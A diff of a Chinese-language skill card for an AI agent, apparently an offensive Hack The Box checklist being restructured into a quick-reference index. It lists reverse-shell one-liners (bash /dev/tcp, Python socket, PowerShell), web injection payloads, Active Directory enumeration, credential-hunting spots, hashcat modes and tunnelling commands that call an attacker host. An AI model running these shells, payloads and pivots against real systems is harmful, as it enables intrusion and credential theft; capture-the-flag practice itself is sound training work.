@@ -1,33 +1,20 @@
 ---
 name: 'htb-master-checklist'
-description: 'HTB 综合攻击检查表：整合全部阶段检查要点，按6阶段组织。每步引用对应详细记忆'
+description: 'HTB 按领域速查索引：题型信号/Web/CMS/反弹Shell/提权优先级/凭据/hashcat 表/横向命令清单，各节指向深卡。完整执行流程见 htb-methodology。'
 metadata: { domain: meta, tier: T1 }
 ---
 > 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
-# HTB 综合攻击检查表
+# HTB 综合攻击检查表（按领域速查索引）
 
-> 整合全部阶段检查要点、~360 台机器攻击链。每阶段引用对应的详细记忆。
+> 📌 按领域速查。**完整执行流程与教训见 htb-methodology 卡**；各深卡按需加载。
 
 ---
 
-## 阶段 0：初始侦察
+## 题型信号速查（题型识别）
 
-### 0.1 端口扫描
-```bash
-nmap -p- --min-rate 10000 -sV -sC -oA nmap/all <IP>
-sudo nmap -sU --top-ports 20 -oA nmap/udp <IP>
-```
+> 🔴 完整题型识别树 + OS 判定 → htb-methodology 卡（阶段0）
 
-### 0.2 OS 判定 → 题型预判
-```
-[ ] Windows Server 2025 → ad-type-recognition 先看 dMSA/KDS
-[ ] Windows Server 2016-2022 → ad-checklist 先看 ADCS/Shadow Credentials
-[ ] Linux 5.10-6.13 → linux-privesc 先看 Copy Fail/Dirty Frag
-[ ] Linux 其他 → linux-privesc 9 阶段
-```
-
-### 0.3 题型信号速查
 | 信号 | 题型 | 记忆 |
 |------|------|------|
 | KDS Root Key 存在 | BadSuccessor/BetterSuccessor | ad-type-recognition |
@@ -38,25 +25,15 @@ sudo nmap -sU --top-ports 20 -oA nmap/udp <IP>
 | ADCS HTTP 端点 | ESC1-16 | adcs-attack-chain |
 | Web 登录页面 | CMS RCE / SSTI / SQLi | cms-framework-rce |
 | `.git/` 目录暴露 | Git 历史泄露 | web-chained-attacks |
-| localhost:25151 (Cobbler) | CVE-2024-47533 | web-chained-attacks |
+| localhost:25151 (Cobbler) | CVE-2024-47533 | cve-2024-47533-cobbler-rce |
 
 ---
 
-## 阶段 1：Web 攻击（如有 HTTP/HTTPS）
+## Web 攻击速查（侦察/初始立足）
 
-### 1.1 枚举
-```bash
-# 目录爆破
-gobuster dir -u http://target -w raft-medium-directories.txt -x php,asp,aspx,jsp,txt,bak
+> 🔴 目录爆破/vhost/CMS 识别命令（nmap/gobuster/ffuf/whatweb）→ htb-methodology 卡（阶段1 侦察）
 
-# Vhost 发现
-ffuf -u http://target -H "Host: FUZZ.target" -w subdomains.txt
-
-# CMS 识别
-whatweb http://target
-```
-
-### 1.2 Web 漏洞速查
+### Web 漏洞速查
 | 漏洞类型 | 速查记忆 | 快速测试 |
 |---------|---------|---------|
 | SQL Injection | mssql-attack-chain / web-attacks | `' OR 1=1--` |
@@ -68,11 +45,11 @@ whatweb http://target
 | LFI | web-attacks#6 | `../../../../etc/passwd` |
 | Command Injection | web-attacks#7 | `; id` `\|id` `\`id\`` `$(id)` |
 | Deserialization | dotnet-pipe-yaml-deserialization（.NET）与 python-sandbox-escape（Python） | 检查 ac ed 00 05 / rO0AB / gAS |
-| Cypher Injection | web-chained-attacks | `'}) RETURN w UNION MATCH ...` |
+| Cypher Injection | cypher-injection | `'}) RETURN w UNION MATCH ...` |
 | H2 Java Alias | h2-java-alias-rce | JDBC URL: `INIT=CREATE ALIAS` |
 | Python Sandbox | python-sandbox-escape | `().__class__.__mro__[-1].__subclasses__()` |
 
-### 1.3 CMS 快速攻击
+### CMS 快速攻击
 | CMS | 快速命令 | 记忆 |
 |-----|---------|------|
 | WordPress | `wpscan --url http://target -e ap,at,u` | cms-framework-rce |
@@ -85,9 +62,8 @@ whatweb http://target
 
 ---
 
-## 阶段 2：拿 Shell
+## 反弹 Shell 速查（初始立足）
 
-### 2.1 反弹 Shell 模板
 ```bash
 # Linux
 bash -i >& /dev/tcp/IP/PORT 0>&1
@@ -97,25 +73,14 @@ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP",PORT));os.dup
 powershell -e <base64_encoded_reverse_shell>
 ```
 
-### 2.2 获 shell 后立即执行
-```bash
-[ ] id; whoami; hostname; ip a
-[ ] sudo -l 2>/dev/null                   # 🔴 第一优先！
-[ ] find / -perm -4000 -ls 2>/dev/null    # SUID
-[ ] getcap -r / 2>/dev/null               # Capabilities
-[ ] ls -la /etc/cron*; crontab -l; systemctl list-timers  # cron-privesc-patterns
-[ ] ss -ltnp | grep 127.0.0.1             # localhost 服务
-[ ] find / -name ".git" -type d 2>/dev/null
-[ ] find / -name "*.conf" -o -name "*.properties" -o -name "*.env" 2>/dev/null
-[ ] ls -la /opt/; ls -la /var/www/
-[ ] find / -name "user.txt" -o -name "root.txt" 2>/dev/null  # 🚨 先搜 flag！
-```
+> 🔴 获 shell 后立即执行序列（env/config/内网服务/flag）→ htb-methodology 卡（阶段3 横向）
+> 🔴 监听端 PTY 纪律（socat/nc + 等待策略）→ htb-methodology 卡
 
 ---
 
-## 阶段 3：Linux 提权
+## Linux 提权速查（提权）
 
-### 3.1 快速优先级（按成功率排序）
+### 提权优先级（按成功率）
 | 优先级 | 检查项 | 记忆 |
 |--------|--------|------|
 | 🔴 1 | `sudo -l` → GTFOBins 对照 | sudo-escape-techniques |
@@ -128,25 +93,19 @@ powershell -e <base64_encoded_reverse_shell>
 | 🟠 8 | localhost root 服务 → eval/exec 注入 | web-chained-attacks |
 | 🟡 9 | Kernel exploit (最后) | searchsploit kernel |
 
-### 3.2 Sudo Escape 一键对照
+### Sudo Escape 一键对照
 → 详见 sudo-escape-techniques 完整矩阵（40+ 命令）
 
-### 3.3 Cron Abuse 一键检查
+### Cron Abuse 一键检查
 → 详见 cron-privesc-patterns 5 种模式
 
 ---
 
-## 阶段 4：Windows / AD 提权
+## Windows / AD 提权速查（提权）
 
-### 4.1 题型判定（🔴 第一步）
-→ 详见 ad-type-recognition + ad-checklist#0
+> 🔴 题型判定 → ad-type-recognition + ad-checklist#0；完整枚举序列 → htb-methodology 卡（阶段4 提权）
 
-```bash
-[ ] systeminfo → OS Build (26100 = Server 2025)
-[ ] nltest /domain_trusts → 跨林？
-```
-
-### 4.2 提权优先级
+### 提权优先级
 | 优先级 | 检查项 | 条件 |
 |--------|--------|------|
 | 🔴 1 | BetterSuccessor | KDS + CreateChild + GenericWrite |
@@ -157,7 +116,7 @@ powershell -e <base64_encoded_reverse_shell>
 | 🔴 6 | SeImpersonate → Potato | whoami /priv |
 | 🔴 7 | SeBackup → SAM dump | whoami /priv |
 
-### 4.3 AD 攻击链速查
+### AD 攻击链速查
 ```bash
 # 域枚举
 nxc smb DC -u '' -p '' --rid-brute      # 用户枚举
@@ -174,9 +133,9 @@ bloodhound-python -d domain -u user -p pass -c All
 
 ---
 
-## 阶段 5：凭据收集
+## 凭据收集速查（横向/提权）
 
-### 5.1 哈希类型速查
+### 哈希类型速查
 | 格式 | 类型 | hashcat -m |
 |------|------|-----------|
 | `$2a$` / `$2b$` / `$2y$` | bcrypt | 3200 |
@@ -189,7 +148,7 @@ bloodhound-python -d domain -u user -p pass -c All
 | 32 hex (全大写) | NTLM | 1000 |
 | WPA2 handshake (.22000) | WPA2 | 22000 |
 
-### 5.2 常见凭据源
+### 常见凭据源
 ```
 [ ] ConsoleHost_history.txt (PowerShell)
 [ ] .git/config, .git-credentials
@@ -207,7 +166,7 @@ bloodhound-python -d domain -u user -p pass -c All
 
 ---
 
-## 阶段 6：横向移动
+## 横向移动速查（横向移动）
 
 ```
 [ ] WinRM: evil-winrm -i TARGET -u user -p pass
@@ -221,6 +180,8 @@ bloodhound-python -d domain -u user -p pass -c All
 [ ] Ligolo-ng: /tmp/agent -connect ATTACKER:PORT -ignore-cert
 [ ] chisel: ./chisel client ATTACKER:PORT R:socks
 ```
+
+> 🔴 横向移动决策树 + 反模式 → lateral-movement 技能；内网服务 fuzz → unknown-service-probe 技能
 
 ---
 
